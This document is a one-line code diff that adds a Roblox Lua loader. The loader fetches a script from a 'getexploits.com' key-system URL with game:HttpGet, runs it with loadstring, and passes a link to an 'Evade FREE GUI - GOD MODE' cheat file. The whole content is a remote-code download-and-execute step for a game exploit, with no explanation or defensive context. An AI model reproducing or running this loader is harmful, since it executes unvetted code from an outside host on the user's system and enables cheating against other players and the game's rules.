@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://getexploits.com/key-system/',true))('https://da.com/936752244018249768/1011380504509034628/Evade_FREE_GUI_-_GOD_MODE__MORE.txt')
